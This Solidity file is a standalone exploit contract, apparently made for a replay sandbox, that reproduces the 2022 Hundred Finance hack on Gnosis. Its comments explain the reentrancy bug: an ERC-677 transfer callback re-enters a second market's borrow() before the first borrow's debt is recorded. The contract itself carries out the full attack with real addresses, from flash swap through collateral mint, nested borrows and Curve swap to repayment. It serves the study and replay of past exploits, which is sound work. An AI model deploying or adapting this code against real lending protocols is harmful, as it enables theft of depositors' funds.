// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-HundredFinance).
//
// The DeFiHackLabs PoC (test/HundredFinance_exp.sol) runs the entire attack
// INLINE in the Foundry `ContractTest` — the `uniswapV2Call` flash-swap
// callback and the ERC-677 `onTokenTransfer` reentrancy hook both live on the
// test contract itself, so there is no standalone contract to deploy. This
// file faithfully copies that inline logic into a self-contained contract
// (entrypoint `run()`; flash callback `uniswapV2Call`; reentrancy hook
// `onTokenTransfer`; a `receive()` for the borrowed native XDAI). Constants and
// the call sequence are copied verbatim from the original test.
//
// Hundred Finance was a Compound-v2 fork on Gnosis (xDai). Its cToken (hToken)
// `borrow()` fires `doTransferOut` — a `token.transfer(to, amount)` on the
// underlying — BEFORE the market's internal borrow accounting (borrowBalance,
// totalBorrows) is fully settled. The Gnosis USDC underlying
// (0xDDAf…7A83, an ERC-677 token) forwards an `onTokenTransfer` callback to
// the recipient mid-transfer. Compound's upstream ReentrancyGuard was never
// ported, so the attacker re-enters a SECOND market's `borrow()` while the
// first is half-applied: the Comptroller's liquidity check sees the freshly-
// minted collateral but not yet the first borrow's debt, so it approves an
// over-borrow on the hXDAI (CEther) market.
//
// Attack flow (one flash swap, all in one tx):
//   1. Flash-borrow ~all the wxDAI/USDC Sushi pair's USDC via pair.swap.
//   2. uniswapV2Call → deposit the USDC into hUSDC (mint collateral),
//      then borrow 90% of it back from hUSDC.
//      ⚠ During hUSDC.borrow's USDC transfer-out, USDC.onTokenTransfer fires.
//         With borrow accounting not yet recorded and the guard absent, the
//         attacker re-enters hXDAI.borrow (CEther) — borrowing a large slice
//         of native XDAI against collateral the Comptroller still values as
//         unencumbered.
//   3. Wrap the received XDAI to wxDAI and swap wxDAI → USDC on Curve.
//   4. Repay the Sushi flash swap (USDC principal + 0.3% fee); keep the rest.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
}

interface IUniswapV2Router {
    function factory() external view returns (address);
}

interface ICompoundToken {
    function borrow(uint256 borrowAmount) external;
    function mint(uint256 amount) external;
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}

interface IWeth {
    function deposit() external payable;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract HundredFinanceDrain {
    IERC20 private constant usdc = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);
    IERC20 private constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);

    address private constant husd = 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee;
    address private constant hxdai = 0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE;

    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    IUniswapV2Router private constant router = IUniswapV2Router(payable(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506));

    uint256 totalBorrowed;
    bool xdaiBorrowed = false;

    function run() external {
        borrow();
    }

    function borrow() internal {
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(wxdai), address(usdc)));
        uint256 borrowAmount = usdc.balanceOf(address(pair)) - 1;

        pair.swap(
            pair.token0() == address(wxdai) ? 0 : borrowAmount,
            pair.token0() == address(wxdai) ? borrowAmount : 0,
            address(this),
            abi.encode("0x")
        );
    }

    function uniswapV2Call(address, uint256 _amount0, uint256 _amount1, bytes calldata) external {
        attackLogic(_amount0, _amount1);
    }

    function attackLogic(uint256 _amount0, uint256 _amount1) internal {
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        totalBorrowed = amountToken;
        depositUsdc();
        borrowUsdc();
        swapXdai();
        uint256 amountRepay = ((amountToken * 1000) / 997) + 1;
        usdc.transfer(msg.sender, amountRepay);
    }

    function depositUsdc() internal {
        uint256 balance = usdc.balanceOf(address(this));
        usdc.approve(husd, balance);
        ICompoundToken(husd).mint(balance);
    }

    function borrowUsdc() internal {
        uint256 amount = (totalBorrowed * 90) / 100;
        ICompoundToken(husd).borrow(amount);
    }

    function borrowXdai() internal {
        xdaiBorrowed = true;
        uint256 amount = ((totalBorrowed * 1e12) * 60) / 100;
        ICompoundToken(hxdai).borrow(amount);
    }

    function swapXdai() internal {
        IWeth(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
    }

    function onTokenTransfer(address _from, uint256, bytes memory) external {
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        address pair = factory.getPair(address(wxdai), address(usdc));

        if (_from != pair && xdaiBorrowed == false) {
            borrowXdai();
        }
    }

    receive() external payable {}
}
